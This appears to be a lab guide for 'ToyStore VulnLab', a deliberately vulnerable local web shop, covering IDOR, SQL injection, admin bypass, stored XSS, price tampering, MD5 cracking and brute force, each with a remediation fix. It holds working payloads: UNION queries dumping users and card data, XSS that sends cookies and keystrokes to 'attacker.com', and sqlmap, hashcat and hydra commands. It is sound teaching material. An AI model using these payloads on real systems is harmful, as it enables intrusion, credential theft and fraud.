# 🎯 ToyStore VulnLab - Penetration Testing Guide

## 📋 Pre-Testing Checklist

- [ ] Application is running on localhost:3000
- [ ] You have test accounts credentials
- [ ] Burp Suite or similar proxy is configured
- [ ] Database access is available
- [ ] This is an isolated lab environment

---

## 🔍 Vulnerability Testing Scenarios

### Scenario 1: User Enumeration & IDOR

**Objective:** Access other users' private information

**Steps:**
1. Register a new account or login as `user` (password: `user12`)
2. Navigate to your profile: http://localhost:3000/profile/1
3. Note your user ID in the URL
4. Change ID to 2: http://localhost:3000/profile/2
5. You can now see admin's profile with email, address, phone

**Expected Results:**
- Successfully view any user's profile
- Access to personal information of other users
- No authorization check performed

**Proof of Concept:**
```bash
# Using curl
curl -c cookies.txt -d "username=user&password=user12" http://localhost:3000/login
curl -b cookies.txt http://localhost:3000/profile/2
# Returns admin's profile
```

**Remediation:**
```javascript
// Add ownership check
if (parseInt(req.params.id) !== req.session.userId && !isAdmin(req)) {
    return res.status(403).send('Access denied');
}
```

---

### Scenario 2: SQL Injection - Data Extraction

**Objective:** Extract sensitive data from database using SQL injection

**Steps:**

#### Test 1: Basic SQLi
1. Navigate to search: http://localhost:3000/search
2. Enter: `' OR '1'='1`
3. All products returned (always-true condition)

#### Test 2: Extract Users Table
```
Input: ' UNION SELECT id,username,email,password_md5,role,created_at FROM users--
URL: http://localhost:3000/search?q=' UNION SELECT id,username,email,password_md5,role,created_at FROM users--
```

#### Test 3: Extract Credit Card Data
```
Input: ' UNION SELECT id,card_number,card_holder,cvv,amount,created_at FROM payments--
```

**Expected Results:**
- Database query succeeds with injected SQL
- Sensitive data displayed on page
- Full database access possible

**Using SQLMap:**
```bash
# Save request to file
# Then use sqlmap
sqlmap -r search_request.txt --dump --batch

# Or directly
sqlmap -u "http://localhost:3000/search?q=test" --cookie="connect.sid=YOUR_SESSION" --dump
```

**Remediation:**
```javascript
// Use parameterized queries
const sqlQuery = `SELECT * FROM products WHERE name ILIKE $1 OR description ILIKE $1`;
const results = await pool.query(sqlQuery, [`%${query}%`]);
```

---

### Scenario 3: Admin Panel Bypass

**Objective:** Access admin dashboard without admin privileges

**Steps:**
1. Login as regular user: `user` / `user12`
2. Try accessing: http://localhost:3000/admin
3. See "Access Denied" message
4. Append query parameter: http://localhost:3000/admin?role=admin
5. Admin panel is now accessible!

**Expected Results:**
- Bypass access control with simple query parameter
- View all users, orders, revenue statistics
- No server-side role verification

**Proof of Concept:**
```bash
curl -c cookies.txt -d "username=user&password=user12" http://localhost:3000/login
curl -b cookies.txt "http://localhost:3000/admin?role=admin"
# Returns admin dashboard HTML
```

**Remediation:**
```javascript
// Only check session role, ignore query parameters
if (!isAdmin(req)) {
    return res.status(403).send('Access Denied');
}
// Remove: const bypassRole = req.query.role;
```

---

### Scenario 4: Stored XSS in Product Reviews

**Objective:** Inject malicious JavaScript that executes for all users

**Steps:**

#### Payload 1: Alert Box
1. Login and visit any product
2. Write review with:
   - Title: `<script>alert('XSS')</script>`
   - Comment: `Great product!`
3. Submit review
4. Refresh page - alert executes

#### Payload 2: Cookie Theft
```html
Title: Best Toy Ever!
Comment: <img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

#### Payload 3: Keylogger
```html
Comment: <script>
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
});
</script>
```

**Expected Results:**
- JavaScript executes in victim's browser
- Can steal cookies/sessions
- Can perform actions as victim
- Persistent across page reloads

**Using Burp Suite:**
1. Intercept POST request to `/product/:id/review`
2. Modify `comment` parameter to include XSS payload
3. Forward request
4. Visit product page to trigger XSS

**Remediation:**
```javascript
// Server-side: Sanitize input
const sanitizeHtml = require('sanitize-html');
const cleanComment = sanitizeHtml(comment);

// Client-side: Use textContent instead of innerHTML
element.textContent = review.comment; // Not .innerHTML
```

---

### Scenario 5: Price Manipulation

**Objective:** Purchase products for $0.01 or free

**Steps:**

#### Using Browser DevTools:
1. Login and add expensive items to cart
2. Proceed to checkout (note total, e.g., $500)
3. On checkout page, press F12 (DevTools)
4. Find element: `<input type="hidden" name="amount" value="500.00">`
5. Right-click → Edit as HTML
6. Change to: `<input type="hidden" name="amount" value="0.01">`
7. Submit payment form
8. Order processed for $0.01!

#### Using Burp Suite:
1. Intercept POST request to `/process-payment`
2. Find parameter: `amount=500.00`
3. Change to: `amount=0.01`
4. Forward request

**Expected Results:**
- Payment processed with manipulated amount
- Order total shows $0.01 instead of actual price
- No server-side price verification

**Proof of Concept:**
```bash
curl -c cookies.txt -d "username=user&password=user12" http://localhost:3000/login

# Add item to cart
curl -b cookies.txt -d "product_id=1&quantity=1" http://localhost:3000/cart/add

# Manipulated checkout
curl -b cookies.txt -d "amount=0.01&card_number=1234567890123456&card_holder=Test&cvv=123&address=Test&phone=123" \
    http://localhost:3000/process-payment
```

**Remediation:**
```javascript
// Calculate total on server-side
const cartItems = await pool.query(/*...*/ );
const calculatedTotal = cartItems.rows.reduce((sum, item) => 
    sum + (parseFloat(item.price) * item.quantity), 0);
// Ignore client's amount, use calculatedTotal
```

---

### Scenario 6: Password Cracking (MD5)

**Objective:** Crack user passwords from database

**Steps:**

#### Extract Hashes:
```bash
docker exec -it toystore_db psql -U vulnuser -d vulnlab
SELECT username, password_md5 FROM users;
```

#### Example Hashes:
- user: `d781eaae8248db6ce1a7b82e58e60435` (user12)
- admin: `e00cf25ad42683b3df678c61f42c6bda` (admin1)

#### Crack with Online Tools:
1. Visit: https://crackstation.net/
2. Paste hash: `d781eaae8248db6ce1a7b82e58e60435`
3. Result: `user12`

#### Crack with Hashcat:
```bash
# Save hashes to file
echo "d781eaae8248db6ce1a7b82e58e60435" > hashes.txt

# Dictionary attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Brute force (6 alphanumeric)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
```

**Expected Results:**
- All passwords cracked within seconds/minutes
- MD5 provides no real security
- Weak password policy makes cracking trivial

**Remediation:**
```javascript
// Use bcrypt or argon2
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);
// Store: hash
// Verify: await bcrypt.compare(password, hash)
```

---

### Scenario 7: IDOR on Orders

**Objective:** View other customers' orders and addresses

**Steps:**
1. Login as user (place an order if needed)
2. View your order: http://localhost:3000/order/1
3. Change ID to 2: http://localhost:3000/order/2
4. View other users' orders, items purchased, addresses

**Testing Script:**
```bash
# Login
curl -c cookies.txt -d "username=user&password=user12" http://localhost:3000/login

# Enumerate orders
for i in {1..10}; do
    echo "Order $i:"
    curl -b cookies.txt http://localhost:3000/order/$i | grep -o "Order #[0-9]*\|Shipping Address.*"
done
```

**Expected Results:**
- Access any order regardless of ownership
- View shipping addresses
- See purchase details

**Remediation:**
```javascript
// Verify ownership
const order = await pool.query(
    'SELECT * FROM orders WHERE id = $1 AND user_id = $2',
    [req.params.id, req.session.userId]
);
if (order.rows.length === 0) {
    return res.status(404).send('Order not found');
}
```

---

### Scenario 8: Sensitive Data Exposure

**Objective:** Access credentials and secrets

#### Test 1: Debug Page
1. Visit: http://localhost:3000/debug
2. View exposed:
   - Database credentials
   - Session secret
   - Environment variables

#### Test 2: Database Direct Access
```bash
# Use credentials from debug page
docker exec -it toystore_db psql -U vulnuser -d vulnlab

# View plain text credit cards
SELECT * FROM payments;
```

**Expected Results:**
- Complete database credentials exposed
- Credit card numbers in plain text
- CVV codes stored
- Session secret disclosed

**Remediation:**
- Remove debug endpoint in production
- Encrypt sensitive data
- Use environment variables (not hardcoded)
- Never expose credentials

---

### Scenario 9: Session Security

**Objective:** Analyze session security

**Steps:**

#### Test 1: Session Cookie Analysis
1. Login and capture session cookie
2. Check flags:
   ```javascript
   // Current: secure: false, httpOnly: false
   // Vulnerable to XSS cookie theft
   ```

#### Test 2: Session Fixation
1. Get a session ID before login
2. Login with that session
3. Session not regenerated (vulnerable)

#### Test 3: Weak Secret
- Secret: `weak-secret-key-12345`
- Can potentially forge sessions

**Remediation:**
```javascript
cookie: { 
    secure: true,       // HTTPS only
    httpOnly: true,     // No JavaScript access
    sameSite: 'strict', // CSRF protection
    maxAge: 3600000     // 1 hour
}
```

---

### Scenario 10: Brute Force Login

**Objective:** Demonstrate lack of rate limiting

**Steps:**

#### Manual Test:
```bash
for i in {1..100}; do
    curl -s -o /dev/null -w "%{http_code}\n" \
        -d "username=admin&password=wrong$i" \
        http://localhost:3000/login
done
```

#### Using Hydra:
```bash
hydra -l admin -P passwords.txt localhost -s 3000 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Expected Results:**
- Unlimited login attempts
- No account lockout
- No CAPTCHA
- No rate limiting

**Remediation:**
```javascript
// Add rate limiting
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // 5 attempts
    message: 'Too many attempts, please try again later'
});
app.post('/login', loginLimiter, async (req, res) => { /*...*/ });
```

---

## 🔬 Advanced Testing Techniques

### Combine Multiple Vulnerabilities

**Attack Chain Example:**
1. SQL Injection → Extract admin's MD5 hash
2. Crack hash → Get admin password
3. Login as admin → Full access
4. Upload malicious file → Potential RCE

### Automated Scanning

**Using OWASP ZAP:**
```bash
# Run automated scan
zap-cli --zap-url http://localhost:8080 quick-scan http://localhost:3000

# Generate report
zap-cli --zap-url http://localhost:8080 report -o vulnerability_report.html
```

**Using Nikto:**
```bash
nikto -h http://localhost:3000
```

---

## 📊 Vulnerability Assessment Template

### Testing Checklist

- [ ] IDOR on profiles tested
- [ ] IDOR on orders tested  
- [ ] SQL injection confirmed
- [ ] XSS payloads tested
- [ ] Admin bypass verified
- [ ] Price manipulation successful
- [ ] Password hashes extracted
- [ ] Credit card data accessed
- [ ] Debug page found
- [ ] Session security analyzed
- [ ] Rate limiting tested
- [ ] File upload exploited

### Severity Ratings

| Finding | CVSS | Severity |
|---------|------|----------|
| SQL Injection | 9.8 | Critical |
| Admin Bypass | 9.1 | Critical |
| Plain Text Cards | 9.4 | Critical |
| MD5 Passwords | 8.1 | Critical |
| Price Manipulation | 8.2 | Critical |
| IDOR | 7.5 | High |
| Stored XSS | 7.1 | High |
| Debug Disclosure | 8.6 | High |

---

## 🎓 Learning Path

### Beginner (Week 1-2)
- Test IDOR vulnerabilities
- Try admin bypass
- View debug information
- Basic SQL injection

### Intermediate (Week 3-4)
- Advanced SQL injection
- XSS payload development
- Price manipulation
- Password cracking

### Advanced (Week 5+)
- Combine multiple vulnerabilities
- Develop exploits
- Write detailed reports
- Create remediation strategies

---

## 📝 Report Writing Template

```markdown
# Vulnerability Assessment Report - ToyStore

## Executive Summary
[Brief overview of findings]

## Scope
- Application: ToyStore E-commerce
- URL: http://localhost:3000
- Test Date: [Date]
- Tester: [Name]

## Findings

### Critical Vulnerabilities
1. SQL Injection in Search
   - Risk: Critical
   - CVSS: 9.8
   - Impact: Full database compromise
   - PoC: [Steps]
   - Remediation: [Fix]

[Continue for all findings...]

## Recommendations
[Priority fixes]

## Conclusion
[Summary]
```

---

## ⚡ Quick Reference

### Common Payloads

**SQL Injection:**
```sql
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT id,username,password_md5 FROM users--
```

**XSS:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**IDOR:**
```
/profile/1 → /profile/2
/order/1 → /order/2
```

---

Happy Testing! 🎯🔒
